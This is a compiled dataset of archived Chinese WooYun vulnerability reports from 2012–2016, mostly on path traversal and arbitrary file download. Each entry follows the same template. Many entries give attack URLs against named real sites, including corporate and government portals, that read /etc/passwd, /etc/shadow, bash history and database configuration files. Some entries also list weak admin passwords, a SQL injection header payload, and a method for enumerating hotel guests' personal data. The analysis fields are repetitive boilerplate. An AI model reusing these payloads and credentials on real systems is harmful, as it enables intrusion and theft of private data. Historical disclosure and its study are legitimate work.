**厂商**: NITC网络营销服务中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于NITC4.0版本的系统 官方未提供下载下载旧版本进行检测首先进行万恶的代码审计，一大堆，慢慢看，习惯把程序员的思路看懂先

**POC**: http://test.nitc.cc/office/db_download.php?action=download&file=./backdb/../../config.php这个比较鸡翅的是需要登陆数据库信息防止被查水表，暂时就停留在这一步了

**绕过**: 直接利用

**修复**: 整个系统，都要加强要过滤，你们比我更加专业！
---

---
### [wooyun-2014-054931] 某市公积金服务平台任意文件下载
**厂商**: 某市公积金服务平台 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参数还是很有个性的~

**POC**: http://www.fzzfgjj.com/web.config.file.aspx

**绕过**: 直接利用

**修复**: 开发人员更专业~
---

---
### [wooyun-2015-0166090] 台北FM90.9官网任意文件下载漏洞（读取/etc/passwd）（臺灣地區）
**厂商**: 台北FM90.9 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网：http://**.**.**.**/本来页面中有个下载音频文件的地方http://**.**.**.**/download_1_Corinthians.php分析下发现它处理有问题，如下面的连接：http://**.**.**.**/downloadfile.php?file=./download/1_Corinthians/1_Corinthians01-01.mp3它传入一个相对地址进去了。。。那么就形成了任意文件读取。。。漏洞地址：http://**.**.**.**/downloadfile.php?file=xxxxxdown下的文件：root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var

**POC**: 已证明

**绕过**: 直接利用

**修复**: 升级+补丁
---

---
### [wooyun-2014-068022] 百度某分站任意文件下载
**厂商**: 百度 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 导致任意文件下载地址：http://ueditor.baidu.com/website/download.html#ueditor（软件下载地址）下载链接：http://ueditor.baidu.com/build/build_down.php?n=ueditor-list.zip去掉后面的文件名ueditor-list.zip构造任意文件下载地址：http://ueditor.baidu.com/build/build_down.php?n=（这里填写文件路径和文件名）

**POC**: 测试：http://ueditor.baidu.com/build/build_down.php?n=../website/examples/uparsedemo.html下载后的文件和网页版的对比：

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-0136284] 天涯社区某系统任意文件读取
**厂商**: 天涯社区 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: OA系统http://oa.tianya.cn//resin-doc/examples/security-basic/viewfile?file=index.jsphttp://oa.tianya.cn//resin-doc/examples/security-basic/viewfile?file=WEB-INF/password.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: aa
---

---
### [wooyun-2012-012351] 盛大sdo某分站目录遍历
**厂商**: 盛大在线 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://test.51ka.sdo.com:8080/WebSuperMarket/http://test.51ka.sdo.com:8080/mutualpoint/http://test.51ka.sdo.com:8080/sftcard/http://test.51ka.sdo.com:8080/images/http://test.51ka.sdo.com:8080/webio/http://test.51ka.sdo.com:8080/web/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置IIS目录权限
---

---
### [wooyun-2013-034152] 某产权交易中心由任意文件下载到渗透进入服务器
**厂商**: 天津产权交易中心 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 天津产权平台（http://www.tprtc.com）有几大类模块包括“企业国有产权挂牌项目”、“企业产权挂牌项目”、“涉诉资产交易平台”等版块，点其中一个模块的链接，会跳转至另外一个项目，如我点击编号为1201CSW20130801002 ，会跳转至该链接http://xinxipingtai.tprtc.com:8080/transaction/D_table/swjy.jsp?no=1201CSW20130801002，通过分析这是交易平台一个子项目，监听端口为0080，初步怀疑是用Tomcat容器，重新打开一个浏览器，输入http://xinxipingtai.tprtc.com:8080回车，熟悉的界面出现在面前，如图所示，Tomcat配置了管理插件，那么我只需要拿到tomcat-users.xml配置文件里面的内容，就可通过Tomcat后台热部署自己的东西，我要部署什么东东你

**POC**: http://xinxipingtai.tprtc.com:8080/transaction/attach/TankPenetration.txt

**绕过**: 直接利用

**修复**: 请加强开发人员的安全意识，不要将Web容器，路径等信息暴漏给用户。修改download.jsp文件，对传入path路径进行校验，如发现下载的文件超出指定的文件夹不作响应或输出错误提示信息。
---

---
### [wooyun-2012-010635] 乐视网众多web容器配置失误，导致核心应用架构及敏感信息暴露
**厂商**: 乐视网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: 通常在做反向代理、负载均衡或集群等情况时，都会使用两种或多种不同web容器搭配使用（特别在j2ee应用上体现更明显（如：Ngnix + Tomcat ;Apache + Tomcat）），由于配置不当，造成上述问题，昨天发现此问题的站点就不下上百个，今天发现你们应用尤其鲜明：首先看这个：http://enp.letv.com/WEB-INF/web.xml (指向同一ip的域名比较多哦！所以很多Struts2远程代码执行的漏洞都在这一ip找到的！这个有人提醒给你们的，好象你们不是很重视！)可浏览web.xml是会导致整个应用结构暴露的，这是j2ee的一个特点，同时加上使用的MVC模式的开源常用

**绕过**: 直接利用

**修复**: 至少禁止掉j2ee应用重要的WEB-INF目录！（同一部署人员的所有应用都检查一下，应该还有不少！）正好奥运会期间，加上你们公司的服务正好是这个方向的，乐视网送台电视机给哥吧！
---

---
### [wooyun-2013-039461] 腾讯某子站任意文件读取漏洞
**厂商**: 腾讯 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以查看腾讯服务器的任意文件包括etc/passwd在内哦！

**POC**: http://mma.qq.com//newqun3/....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

**绕过**: 直接利用

**修复**: 你们懂得，希望腾讯公司在建立新站时也不要忽视网络安全。。。。
---

---
### [wooyun-2014-060590] DouPHP轻量级企业建站系统任意文件下载源码漏洞
**厂商**: douco.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件admin/backup.php第187行开始。/**+----------------------------------------------------------* 备份下载+----------------------------------------------------------*/if ($_REQUEST['rec'] == 'down'){$sql_file_name = $dou->addslashes_deep($_GET['sql_file_name']);ob_clean();if ($fp = @ fopen("../data/backup/" . $sql_file_name, 'r')){header("Content-type: application/zip");header("Content-Disposition: attachme

**POC**: http://demo.douco.com/admin/backup.php?rec=down&sql_file_name=../../captcha.php

**绕过**: 直接利用

**修复**: 验证绝对路径。只允许下载备份目录内的文件。
---

---
### [wooyun-2012-014220] 虾米网任意文件下载
**厂商**: 虾米网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞有些奇怪，有时会返回403，但是多尝试几次就可以成功下载任意文件从而进一步渗透上一个提交的有个问题忘说了http://img.xiami.com/images/common/uploadpic/20/13515781202937.jpg/1.phpssasssss这样提交会报错，报出路径，具体什么原理我也没弄明白，估计是解析漏洞没补好造成的。

**POC**: http://loop.xiami.com/event/downloadpic?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/sysconfig/network-scripts/ifcfg-eth0没确认是否需要登陆

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2016-0171282] 中粮集团某系统任意文件下载
**厂商**: 中粮集团有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中粮集团用友erp系统任意文件下载地址：http://nc.cofco.com/测试如下http://nc.cofco.com/NCFindWeb?service=IPreAlertConfigService&filename=../../../../../etc/passwd数据库配置http://hr.minshengec.cn/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml好了就这些咯

**POC**: 中粮集团用友erp系统任意文件下载地址：http://nc.cofco.com/测试如下http://nc.cofco.com/NCFindWeb?service=IPreAlertConfigService&filename=../../../../../etc/passwd数据库配置http://hr.minshengec.cn/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml好了就这些咯

**绕过**: 直接利用

**修复**: 打补丁，系统升级
---

---
### [wooyun-2012-05907] 中央政府网邮箱系统目录遍历
**厂商**: CNVD | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.gov.cn/extend/zh_cn/9luCih4CiWMQQQXZQYAXFQX7XJAUUXZ8w7ygWi/jsp/icp/user/js/CVS/Roothttp://mail.gov.cn/extend/zh_cn/9luCih4CiWMQQQXZQYAXFQX7XJAUUXZ8w7ygWi/jsp/icp/user/js/CVS/Repositoryhttp://mail.gov.cn/extend/zh_cn/9luCih4CiWMQQQXZQYAXFQX7XJAUUXZ8w7ygWi/jsp/icp/user/user_form.jsphttp://mail.gov.cn/extend/zh_cn/a0Wna8AnaJCQaQXOKeqNVi3z3d1i93dqd1lous/jsp/business/register/这个http://mail.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们知道的 。    我随便看看而已，表找俺..
---

---
### [wooyun-2013-046885] 易佰连锁旅店漏洞（用户信息泄漏、订单信息泄漏）可查开房
**厂商**: 易佰连锁旅店 | **年份**: 2013 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先，出现问题的站点http://new.100inn.cc/目录遍历然后翻了翻，找到另一个站点过去看看，有一个目录遍历很轻松找到接口，可以查看订单信息，用户信息，等等等等~~~~~

**POC**: 自己弄了个账号，拿个订单号拿去接口查一下，确实有信息订单号是8位日期+6位数字，6位数字基本上递增状态既然说没有办法遍历，那我就拿一段订单号来跑一下吧~~~选取20131224xxxxxx这里的1000个订单吧看结果，长度2122为不存在订单，大于2122就是有数据了给一个大于2122的结果吧最后构造的1000个订单号里面一共查到有数据的有572个有数据啊~~~最后，通过订单号里面的手机号或者邮箱，还可以通过接口查用户信息包括身份证号~~~

**绕过**: 直接利用

**修复**: 怎么说呢，权限这个很关键
---

---
### [wooyun-2013-039831] 联想某后台管理员弱口令(近19W用户)
**厂商**: 联想 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL:http://ideaclub.and-c.com/forum/admin.php也是积分商城、但是不在同一服务器上、管理员：小i密码：123456可改admin的密码（测试已改为wooyun）可改用户积分，积分可兑换小礼物哦~~另外一联想活动网备份文件下载，泄露部分代码了。http://go.163.com/2013/0927/lenovo/index.php.bak还有这是用户的什么玩意~~http://go.163.com/2013/0927/lenovo/user.txt

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.加强密码安全意识2. admin密码修改回去。（测试时被改为wooyun）3.备份文件及时转移或删除
---

---
### [wooyun-2014-075293] 安卓RE文件管理器任意文件读取
**厂商**: Root Explorer RE管理器 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 暴露了一个content provider，可以借助这个provider读取任意文件，当然得有权限嘛。provider地址：content://com.speedsoftware.rootexplorer.content/只要在后面跟上相应的路径，比如：content://com.speedsoftware.rootexplorer.content/etc/hosts，发请求后就可以读取/etc/hosts的文件内容。也就是说，可以不申请什么权限，借助该provider读取所能读取的任意文件。当然该软件目录下的所有文件都可以读取的。sd卡也没问题。

**POC**: 读取/etc/hosts读取sdcard

**绕过**: 直接利用

**修复**: 加权限
---

---
### [wooyun-2015-0138138] 高楼迷某处SQL注射已打入后台（目录遍历/各大洲城市地理信息，6500多楼盘情况随意更改）
**厂商**: 高楼迷 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注入点：http://top.gaoloumi.com/citylist.php?id=43数据库及管理员权限：2个数据库！当前数据库为"toptop".得到用户名和密码。后台地址：http://top.gaoloumi.com/system/login.php成功进入。。可任意添加总管理员，这里我没演示。可以修改各大洲城市信息200多国家。我国107个主要城市信息城市楼盘信息修改存在数据库备份，不过不行，备份未回显也好累的，未深入，先到这了！

**POC**: 目录遍历：http://top.gaoloumi.com/Inc

**绕过**: 直接利用

**修复**: 删除不必要显示的目录，敏感字符过滤。
---

---
### [wooyun-2015-0164913] 万科企业股份有限公司某分站配置不当导致任意文件下载
**厂商**: 万科企业股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://runforfun.vanke.com/web/DownFile.aspx?Path=/web.config

**POC**: 登陆一下邮箱看看，有啥。有部分应聘信息：还有大量邮箱验证信息：

**绕过**: 直接利用

**修复**: you know
---

---
### [wooyun-2015-095993] 新疆电信某站点SQL注射漏洞
**厂商**: 中国电信 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.189hao.cn/除了sql注射 还有目录遍历 还有一些小问题 也都发上来吧http://www.189hao.cn/protected/http://www.189hao.cn/game/http://www.189hao.cn/test.php

**POC**: GET / HTTP/1.1User-Agent: if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/X-Requested-With: XMLHttpRequestReferer: http://www.189hao.cn/Cookie: user_sign=xinctc; 1ae6ff9df437e02a1ba563bbdd58e0d4=1; d38c2a69a36f9ac6c8f76912bf1ab567=1; d5

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0163395] 中粮我买网某系统存在任意文件下载漏洞
**厂商**: 中粮我买网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://118.144.75.72/platform/framework/global/login.jsp扫描的时候发现这么个路径http://118.144.75.72/platform/framework/global/down.jsphttp://118.144.75.72/platform/framework/global/down.jsp?link=/WEB-INF/web.xml

**POC**: 你懂的http://118.144.75.72/platform/framework/global/down.jsp?link=/../../../../../../../../../../etc/passwdhttp://118.144.75.72/platform/framework/global/down.jsp?link=/../../../../../../../../../../etc/shadow

**绕过**: 直接利用

**修复**: 过滤下
---

---
### [wooyun-2015-0103356] 某国家科技服务信息化工程Resin弱口令、任意文件读取及源码泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家卫生和计划生育委员会科技服务信息化工程http://jsw.e-health.org.cn/resin-admin/status.php弱口令admin  admin任意文件读取http://jsw.e-health.org.cn/resin-doc/examples/db-jdbc/viewfile?file=WEB-INF/resin-web.xml源码泄露http://jsw.e-health.org.cn/resin-doc/viewfile/?contextpath=/.\../&servletpath=&file=index.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改密码控制权限
---

---
### [wooyun-2014-076761] 太平保险某站点任意文件读取(二)
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 太平保险http://www.hk.cntaiping.com任意文件读取http://www.hk.cntaiping.com/include/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&filepath=download%2Fhttp://www.hk.cntaiping.com/include/getfile.php?filename=55&file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&filepath=download%2Fat:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bashbin:x:1:1:bin:/bin:/bin

**POC**: 如上

**绕过**: 直接利用

**修复**: 权限设置
---

---
### [wooyun-2014-080957] 6个政府网站存在任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.中国桐城门户网站—桐城派故里 黄梅戏之乡—中国桐城欢迎您http://220.180.203.210/index.actionhttp://220.180.203.210/servlet/FileDownload?filepath=C%3a%5cwindows%5csystem32%5cdrivers%5cetc%5chosts2.鄂尔多斯在线-鄂尔多斯市人民政府网站http://www.ordos.gov.cn/http://www.ordos.gov.cn/swssp/servlet/FileDownload?filepath=C%3a%5cwindows%5csystem32%5cdrivers%5cetc%5chosts3.永康市政府信息公开发布系统http://www.yk.gov.cn:3721/zwgk/http://www.yk.gov.cn:3721/zwgk/ser

**POC**: 4.湖北省网上行政审批通用系统http://221.232.224.92:8081/任意文件下载漏洞http://221.232.224.92:8081/servlet/FileDownload?filepath=C%3a%5cwindows%5csystem32%5cdrivers%5cetc%5chosts5.通辽市政务服务中心http://www.tlzw.net/index/showIndex.action任意文件下载http://www.tlzw.net/servlet/FileDownload?filepath=C%3a%5cwindows%5csystem32%5cdrivers

**绕过**: 直接利用

**修复**: 权限问题
---

---
### [wooyun-2012-013723] j2ee分层架构安全（注册乌云1周年庆祝集锦） --  TOM
**厂商**: TOM在线 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://search.auto.tom.com/WEB-INF/web.xmlhttp://search.auto.tom.com/WEB-INF/classes/beans.xmlhttp://data.auto.tom.com/WEB-INF/classes/beans.xml（抱歉！抱歉！发现前面上错图了，更正一下！）附带两struts2远程代码执行漏洞：http://637.tom.com/login-share/logout/logout.actionhttp://englishok.tom.com/club/clubShow.action/data/apache-tomcat

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2016-0170836] 比亚迪官网任意目录遍历
**厂商**: bydauto.com.cn | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意中浏览报错，发现是Resin 版本v3.0.17  版本低导致任意目录遍历http://www.byd.cn/c:/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2015-098978] Python开源框架Tornado某缺陷可能造成文件读取漏洞
**厂商**: Tornado开源框架 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最近在筹备写一篇关于“任意文件读取”的文章。。。没想到写文章的过程中发现tornado的一个小问题，提出来希望引起大家的重视。首先，tornado是一个全异步的框架，它有有一个专门处理静态文件的控制器，名字叫StaticFileHandler，在文档（http://www.tornadoweb.org/en/stable/web.html#tornado.web.Application）中可以得知：我们只要指定一个目录对应到这个控制器中，即可在HTTP请求中直接请求到这个目录下的文件。而且，tornado在setting中，也可以直接指定一个static_path，来说明静态文件放在哪个目录下：那么我们直接吧example拿来，增加一个static_path的设置项：#!/usr/bin/pythonimport tornado.ioloopimport tornado.webclass 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: root = os.path.abspath(root) + os.path.sep
---

---
### [wooyun-2015-0149789] 大华某漏洞导致某省消防总队某系统任意文件下载、弱口令-续
**厂商**: 某省消防总队 | **年份**: 2015 | **类型**: 基础设施弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 基础设施弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别基础设施弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**在继续拜读http://**.**.**.**/bugs/wooyun-2015-0143173文章后，继续测试，虽然加入了验证密码次数，但这弱口令太弱了。佩服管理员。管理员弱密码：system 123456

**POC**: 同上

**绕过**: 直接利用

**修复**: 修改复杂密码
---

---
### [wooyun-2013-028337]  广东省某市卫生局任意文件下载（大量信息及个人身份信息泄露）
**厂商**: 某市卫生局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 各种doc,xls,pdf,ppt,txt,rar文件下载由于数据量大，也没下载几个，随便看了下，赶紧修复吧-_-!地址http://www.sgwsj.gov.cn/admin/upimg/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: -_-!
---

---
### [wooyun-2013-029147] 某省招商局数据库文件下载漏洞
**厂商**: 某省招商局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 链接http://qhec.gov.cn/sitefiles/这个文件可以被下载，下载在本地。将文件后缀名改为.mdb，用access可以打开，几乎所有重要数据都被泄密。想要什么文件自己下载去，后台我就不找了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 大家一起想办法。
---

---
### [wooyun-2013-032991] 中央某部研究院与某省级地震局文件下载漏洞轻松获取passwd
**厂商**: 两个政府站点 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 财政部财政科学研究院：http://cks.mof.gov.cn/漏洞地址：http://cks.mof.gov.cn/crifs/content/docmanage/download.jsp?filePath=../../../../../../etc/passwd湖南省地震局：http://www.hnea.gov.cn/漏洞地址：http://www.hnea.gov.cn/manage/content/docmanage/download.jsp?filePath=/tzgg/200901/../../../../../../etc/passwd

**POC**: 财政部研究院：湖南省地震局：

**绕过**: 直接利用

**修复**: 当时我也惊呆了~
---

---
### [wooyun-2014-076974] DouPHP某漏洞导致目录遍历
**厂商**: douco.com | **年份**: 2014 | **类型**: 默认配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对DouPHP代码进行审计，自动化扫描发现有一处$_GET['path']。三十八行：$current_path = realpath($root_path) . '/';当$root_path被realpath以后，不存在的会返回空。看了下文件名，咦，是file_manager_json.php。乌云上有这样的例子呀。WooYun: Kindeditor特定情况可能会导致全盘浏览

**POC**: 直接在demo站演示吧：报错，读下本地路径：

**绕过**: 直接利用

**修复**: 验证绝对路径
---

---
### [wooyun-2015-0157173] 国美某系统存在任意文件下载漏洞
**厂商**: 国美控股集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://chat1.gome.com.cn/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: http://chat1.gome.com.cn/live800/downlog.jsp?path=/&fileName=/etc/shadowhttp://chat1.gome.com.cn/live800/downlog.jsp?path=/&fileName=/root/.bash_history

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-0127943] 自如某系统可导致任意文件读取（/etc/passwd）
**厂商**: homelink.com.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://price.ziroom.com.cn/?_p=../../../../../../../../../../etc/passwd%00.jpg

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2014-057001] 某政府系统存在任意文件下载漏洞
**厂商**: 讯飞科技 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载。好像没什么特别好介绍的了，看证明即可。厂商：讯飞科技

**POC**: http://220.168.55.61/FileDownloadServlet?websiteId=1&templateName=/&fileNames=../../WEB-INF/config/db/dataSource.xmlhttp://jydd.xjedu.gov.cn/FileDownloadServlet?websiteId=1&templateName=/&fileNames=../../WEB-INF/config/db/dataSource.xmlhttp://124.117.230.249/FileDownloadServlet?websiteId=1&templateN

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0129564] 某高校通用应用存在任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

